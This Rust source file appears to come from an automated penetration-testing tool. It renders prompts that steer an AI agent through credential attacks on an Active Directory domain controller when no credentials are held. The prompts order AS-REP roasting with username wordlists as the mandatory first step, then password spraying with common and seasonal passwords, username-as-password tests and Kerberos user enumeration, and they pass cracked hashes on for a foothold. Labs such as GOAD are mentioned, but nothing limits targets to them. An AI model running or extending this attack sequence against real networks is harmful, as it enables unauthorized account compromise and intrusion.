//! Technique enforcement prompt branch WITHOUT credentials.

use std::collections::HashMap;

use tera::Context;

use crate::prompt::helpers::insert_state_context;
use crate::prompt::templates::{render_template_with_context, TASK_CREDACCESS_NO_CRED};
use crate::prompt::StateSnapshot;

use super::Params;

/// Try to generate a no-credential technique enforcement prompt (Branch 5).
/// Returns `Some` if conditions match, `None` otherwise.
pub(super) fn try_generate(
    task_id: &str,
    p: &Params<'_>,
    state: Option<&StateSnapshot>,
) -> Option<anyhow::Result<String>> {
    let no_cred_techniques = !p.has_password && !p.has_hash;
    if p.techniques.is_empty() || !no_cred_techniques {
        return None;
    }

    let dc_ip = p.dc_ip;
    let domain = p.domain;

    let no_cred_map: HashMap<&str, String> = [
        (
            "asrep_roast",
            format!(
                "asrep_roast - MANDATORY FIRST ACTION, DO THIS BEFORE \
                 ANYTHING ELSE. AS-REP roast yields crackable $krb5asrep$ \
                 hashes for any account with Kerberos pre-auth disabled \
                 — zero credentials required, highest-EV cold-start move. \
                 Default lab builds (GOAD, BadBlood, vagrant) always have \
                 ≥1 vulnerable account.\n\
                 \x20  Cold-start (no users known yet):\n\
                 \x20    asrep_roast(dc_ip='{dc_ip}', domain='{domain}', users_file='/usr/share/seclists/Usernames/Names/names.txt')\n\
                 \x20  If first wordlist empty, retry with broader lists:\n\
                 \x20    asrep_roast(dc_ip='{dc_ip}', domain='{domain}', users_file='/usr/share/seclists/Usernames/top-usernames-shortlist.txt')\n\
                 \x20    asrep_roast(dc_ip='{dc_ip}', domain='{domain}', users_file='/usr/share/seclists/Usernames/cirt-default-usernames.txt')\n\
                 \x20  Once any users are known (from kerberos_user_enum_noauth or LDAP), prefer that list:\n\
                 \x20    asrep_roast(dc_ip='{dc_ip}', domain='{domain}', known_users=['user1','user2',...])\n\
                 \x20  Hand any $krb5asrep$ hash to the cracker immediately — one cracked hash = authenticated foothold."
            ),
        ),
        (
            "username_as_password",
            format!(
                "username_as_password(target='{dc_ip}', domain='{domain}') \
                 - test if users have username=password (e.g., testuser:testuser). \
                 LOW priority: only run AFTER asrep_roast has been attempted on at least one wordlist."
            ),
        ),
        (
            "password_spray",
            format!(
                "password_spray - LOW priority without known users. DO NOT call this \
                 until asrep_roast has been attempted at least once. Sprays against \
                 unknown users burn dispatch budget with near-zero yield. After asrep_roast \
                 has run, call ONCE PER PASSWORD:\n\
                 \x20  Standard: password_spray(target='{dc_ip}', domain='{domain}', password='Password1')\n\
                 \x20  Standard: password_spray(target='{dc_ip}', domain='{domain}', password='Welcome1')\n\
                 \x20  Standard: password_spray(target='{dc_ip}', domain='{domain}', password='Passw0rd!')\n\
                 \x20  Season: password_spray(target='{dc_ip}', domain='{domain}', password='Winter2025')\n\
                 \x20  Season: password_spray(target='{dc_ip}', domain='{domain}', password='Spring2026')"
            ),
        ),
        (
            "kerberos_user_enum_noauth",
            format!(
                "kerberos_user_enum_noauth(dc_ip='{dc_ip}', domain='{domain}') \
                 - enumerate valid usernames via Kerberos error codes. Run AFTER asrep_roast \
                 (asrep_roast on a wordlist already discovers users implicitly), then re-run \
                 asrep_roast with the discovered names."
            ),
        ),
    ]
    .into_iter()
    .collect();

    let mut instructions = Vec::new();
    for (i, technique) in p.techniques.iter().enumerate() {
        let idx = i + 1;
        if let Some(desc) = no_cred_map.get(technique.as_str()) {
            instructions.push(format!("{idx}. {desc}"));
        } else {
            instructions.push(format!("{idx}. {technique}(...)"));
        }
    }

    if instructions.is_empty() {
        return None;
    }

    let targets_display = if p.targets.is_empty() {
        "N/A".to_string()
    } else {
        p.targets.join(", ")
    };

    let mut ctx = Context::new();
    ctx.insert("task_id", task_id);
    ctx.insert("domain", domain);
    ctx.insert(
        "dc_ip_display",
        if dc_ip.is_empty() { "N/A" } else { dc_ip },
    );
    ctx.insert("targets_display", &targets_display);
    ctx.insert("instructions_text", &instructions.join("\n"));
    insert_state_context(&mut ctx, state, "credential_access", Some(dc_ip));

    Some(render_template_with_context(TASK_CREDACCESS_NO_CRED, &ctx))
}
